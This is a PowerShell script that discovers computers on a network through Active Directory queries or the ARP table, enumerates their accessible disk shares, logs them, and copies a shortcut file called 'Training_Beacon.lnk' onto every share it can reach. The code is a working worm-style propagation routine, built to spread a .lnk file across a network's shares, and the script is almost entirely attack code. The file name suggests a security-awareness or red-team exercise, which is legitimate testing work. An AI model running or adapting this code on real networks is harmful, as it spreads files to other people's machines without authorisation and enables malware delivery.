# 1. Target Discovery (ADSI with Workgroup Fallback)
$targets = @()

try {
    Write-Host "Attempting Domain Discovery (ADSI)..." -ForegroundColor Cyan
    $searcher = [adsisearcher]"(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    # If this line fails, it triggers the 'catch' block
    $targets = $searcher.FindAll() | ForEach-Object { $_.Properties.name }
    Write-Host "Domain success! Found $($targets.Count) computers." -ForegroundColor Green
}
catch {
    Write-Host "Domain unreachable. Falling back to Workgroup Discovery (ARP)..." -ForegroundColor Yellow
    # Get local neighbors that aren't the loopback or itself
    $targets = (Get-NetNeighbor -AddressFamily IPv4 | 
                Where-Object { $_.State -ne "Unreachable" -and $_.IPAddress -notmatch "127.0.0.1|169.254" }).IPAddress
    Write-Host "Workgroup fallback found $($targets.Count) potential IPs." -ForegroundColor Green
}

# 2. Enumerate Shares and Spread
$logPath = "C:\Users\Public\enum.txt"
"--- Scan Started $(Get-Date) ---" | Out-File $logPath

foreach ($server in $targets) {
    Write-Host "Probing $server..." -ForegroundColor Gray
    
    # net view works for both Names (Domain) and IPs (Workgroup)
    $shares = net view "\\$server" 2>$null | Select-String "Disk"
    
    if ($shares) {
        foreach ($line in $shares) {
            # Clean up the share name from the 'net view' string
            $shareName = ($line.ToString() -split '\s{2,}')[0]
            $sharePath = "\\$server\$shareName"
            
            Write-Host "Found Accessible Share: $sharePath" -ForegroundColor Green
            $sharePath | Add-Content -Path $logPath
            
            # 3. Attempt to spread the .lnk file
            try {
                Copy-Item -Path "$home\Desktop\Training_Beacon.lnk" -Destination "$sharePath\" -ErrorAction SilentlyContinue
                Write-Host "  [+] Spread successful to $sharePath" -ForegroundColor Magenta
            } catch { }
        }
    }
}
